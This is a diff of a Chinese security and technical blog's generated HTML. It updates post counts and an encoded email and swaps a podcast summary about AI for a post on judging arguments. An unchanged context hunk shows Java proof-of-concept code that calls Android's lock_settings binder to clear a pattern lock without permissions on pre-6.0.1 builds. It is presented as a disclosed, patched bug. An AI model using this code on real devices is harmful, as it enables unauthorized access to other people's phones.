@@ -122,13 +122,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-count">102</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -281,7 +281,7 @@
 
 <h3 id="2）-Android-6-0-1-MOB3OM-手势密码清除漏洞"><a href="#2）-Android-6-0-1-MOB3OM-手势密码清除漏洞" class="headerlink" title="2） Android 6.0.1 MOB3OM 手势密码清除漏洞"></a>2） Android 6.0.1 MOB3OM 手势密码清除漏洞</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> getIBinder(<span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">data1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">reply1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">		data1.writeByteArray(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">255</span>]);</span><br><span class="line">		serviceBinder.transact(<span class="number">7</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (RemoteException e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">				.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,<br>导致apk 不需要任何权限就可以将手势密码清除. </p>
-<p>这个问题已经修复 author Jim Miller <a href="mailto:&#106;&#x61;&#103;&#103;&#105;&#x65;&#x73;&#64;&#103;&#111;&#x6f;&#103;&#108;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#106;&#x61;&#103;&#103;&#105;&#x65;&#x73;&#64;&#103;&#111;&#x6f;&#103;&#108;&#x65;&#x2e;&#x63;&#111;&#x6d;</a>	Wed Apr 13 16:35:36 2016 -0700</p>
+<p>这个问题已经修复 author Jim Miller <a href="mailto:&#106;&#x61;&#103;&#103;&#105;&#x65;&#115;&#64;&#103;&#x6f;&#x6f;&#103;&#x6c;&#101;&#x2e;&#99;&#x6f;&#x6d;">&#106;&#x61;&#103;&#103;&#105;&#x65;&#115;&#64;&#103;&#x6f;&#x6f;&#103;&#x6c;&#101;&#x2e;&#99;&#x6f;&#x6d;</a>	Wed Apr 13 16:35:36 2016 -0700</p>
 <p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p>
 <p>但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. </p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
@@ -1063,7 +1063,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/ai_thinking/">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/zhengweizhongyao/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -1081,7 +1081,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/ai_thinking/" class="post-title-link" itemprop="url">认知被 AI 暴击的瞬间</a>
+          <a href="/cn/zhengweizhongyao/" class="post-title-link" itemprop="url">训练思维，判断观点</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1092,7 +1092,7 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2023-05-23 00:00:00" itemprop="dateCreated datePublished" datetime="2023-05-23T00:00:00+08:00">2023-05-23</time>
+      <time title="Created: 2023-06-19 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-19T00:00:00+08:00">2023-06-19</time>
     </span>
 
   
@@ -1105,16 +1105,33 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p><a target="_blank" rel="noopener" href="https://podcasts.apple.com/us/podcast/%E8%AE%A4%E7%9F%A5%E8%A2%ABai%E6%9A%B4%E5%87%BB%E7%9A%84%E7%9E%AC%E9%97%B4/id1614381317?i=1000598827531">https://podcasts.apple.com/us/podcast/%E8%AE%A4%E7%9F%A5%E8%A2%ABai%E6%9A%B4%E5%87%BB%E7%9A%84%E7%9E%AC%E9%97%B4/id1614381317?i=1000598827531</a></p>
-<p>今天听了一期「认知被 AI 暴击的瞬间》，里面有几个挺有意思的话题 。</p>
-<h2 id="“AGI”技术目前存在的哪些问题-？"><a href="#“AGI”技术目前存在的哪些问题-？" class="headerlink" title="“AGI”技术目前存在的哪些问题  ？"></a>“AGI”技术目前存在的哪些问题  ？</h2><p>首先是算力的问题，早期大家在使用 ChatGPT 的时候应该都遇上了无法响应的情况，包括后来大范围的封号，限制特定机房 IP 段的访问，这些其实都是算力不足的表现。虽然 Google 号称 PaLM 2 的 Gecko 模型可以在手机上运行，具体的文本生成效果和能量消耗情况都没有详细的信息。</p>
-<p>其次，ChatGPT 这些 Ai 程序生成的内容并不总能满足需求，有时候甚至觉得有点傻，受限于学习的数据和算法模型，人工智能领域正在挑战其不太擅长的通用人工智能，在专用人工智能方面（比如下围棋）的许多地方，人类早已经不是对手了。</p>
-<p>最后，AGI 程序是不能有「价值判断」的，没有价值观就可能生成有害的内容，这些内容甚至可能对人类产生威胁。</p>
-<h2 id="人脑和“Ai脑”工作方式的主要区别-？"><a href="#人脑和“Ai脑”工作方式的主要区别-？" class="headerlink" title="人脑和“Ai脑”工作方式的主要区别 ？"></a>人脑和“Ai脑”工作方式的主要区别 ？</h2><p>人脑的特点是以很低的功耗快速响应，这就是人们喜欢宏大叙事和模式识别的原因。按照康德哲学的观念「人为自然界立法」，客观对象即人的认识对象不是在那里等着你去认识，而是由你的认识过程能动地建立起一个对象。</p>
-<p>大语言模型 (LLM)则是通过对大规模语料库的训练和自然语言处理技术的应用，使得模型能够理解和生成自然语言，并能够执行各种语言任务，如文本生成、机器翻译、语音识别等。</p>
-<h2 id="人类应该担心被-Ai-取代，甚至还有点恐惧吗-？"><a href="#人类应该担心被-Ai-取代，甚至还有点恐惧吗-？" class="headerlink" title="人类应该担心被 Ai 取代，甚至还有点恐惧吗 ？"></a>人类应该担心被 Ai 取代，甚至还有点恐惧吗 ？</h2><p>首先，我们应该充分利用 Ai 的能力来完成各种任务，Ai 应该作为人类的 「副驾」而非竞争对手。在国际象棋上出现了人和 ai 相结合的程序，自动判断什么情况用 Ai 判断，什么情况用人类判断，据说打败了不少 master 模型。</p>
-<p>Will 老师则提出一个「工具人」概念，只能执行任务没有自己的思想就是工具人。人类和 Ai 的关系可以简单地理解为把机器的工作还给机器，这也会带来生产力的大幅提高。</p>
-<p>另外，Ai 是没有价值判断和整合能力的，Ai 可以快速阅读财务报表，快速生成各种基面本信息，但是问 Ai 到底该投资哪家公司，你能相信 Ai 的结论吗 ？或者你用 Ai 生成了一份投研报告交给老板，老板觉得挺好，但可能还是会问你具体的看法，这或许又回到了另一个问题，真的就完全相信 Ai 吗 </p>
+          <ol>
+<li><p>避免过度解读</p>
+<ul>
+<li>好的思维方式大体符合《孙子兵法》中「以正合，以奇胜」，这里的奇是机动兵力的意思。我们在了解事情的时候，首先要理解主流观点，这样我们做事才有坚实的起点，一上来就看非主流观点，很可能就丢掉了根本而陷入旁支细节去了。</li>
+</ul>
+</li>
+<li><p>证伪比证实更重要</p>
+<ul>
+<li>人类对世界的认知都是片面的，只是不断地接近真理。很多你认为可以自洽，可以理解的原因，可能不是真正的原因，并不是因果关系，甚至可能都不是相关关系。</li>
+<li>把错误的原因当成真正的原因，要倒大霉。一定要小心无法证伪的推论，一个事情成功的因素可以有很多，都可以解释的通。</li>
+<li>常识之所以重要是因为经过了长时间的证实和证伪是可靠的结论，遵循常识就可以避开很多的错误和陷阱</li>
+</ul>
+</li>
+<li><p>判定利益冲突</p>
+<ul>
+<li>当发表意见的人和所讨论的主题利益相关，那么其结可能就会有明显的偏向性。</li>
+<li>使用逻辑过滤信息和结论</li>
+<li>得出问题结论的推理过程需要符合逻辑，不能依靠想象。</li>
+</ul>
+</li>
+<li><p>利用成本思维进行判断</p>
+<ul>
+<li>做任何事情都有成本，当接受的信息太多的时候，可以用成本因素进行过滤，通过成本来思考人们做事的初衷和理由是有效的。</li>
+</ul>
+</li>
+</ol>
+<p>#硅谷来信 #吴军</p>
 
       
     </div>
